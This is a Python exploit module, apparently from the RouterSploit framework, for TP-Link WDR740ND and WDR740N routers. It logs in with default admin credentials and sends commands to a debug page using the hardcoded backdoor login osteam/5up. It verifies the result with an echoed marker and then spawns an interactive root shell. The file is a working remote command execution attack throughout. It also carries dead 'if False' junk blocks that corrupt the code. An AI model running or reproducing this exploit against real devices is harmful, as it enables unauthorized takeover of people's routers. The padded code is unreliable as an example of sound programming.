import re
from urllib.parse import quote
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'TP-Link WDR740ND & WDR740N Backdoor RCE', 'description': 'Exploits TP-Link WDR740ND and WDR740N backdoor vulnerability that allows executing commands on operating system level.', 'authors': ('websec.ca', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('http://websec.ca/advisories/view/root-shell-tplink-wdr740',), 'devices': ('TP-Link WDR740ND', 'TP-Link WDR740N')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')
    username = OptString('admin', 'Username to log in with')
    password = OptString('admin', 'Password to log in with')

    def run(self):
        if False:
            print('Hello World!')
        if self.check():
            print_success('Target is vulnerable')
            print_status('Invoking command shell')
            shell(self)
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    def execute(self, cmd):
        if False:
            i = 10
            return i + 15
        cmd = quote(cmd)
        path = '/userRpm/DebugResultRpm.htm?cmd={}&usr=osteam&passwd=5up'.format(cmd)
        response = self.http_request(method='GET', path=path, auth=(self.username, self.password))
        if response is None:
            return ''
        if response.status_code == 200:
            regexp = 'var cmdResult = new Array\\(\\n"(.*?)",\\n0,0 \\);'
            res = re.findall(regexp, response.text)
            if len(res):
                return '\n'.join(res[0].replace('\\r\\n', '\r\n').split('\n'))
        return ''

    @mute
    def check(self):
        if False:
            while True:
                i = 10
        marker = utils.random_text(32)
        cmd = 'echo {}'.format(marker)
        response = self.execute(cmd)
        if marker in response:
            return True
        return False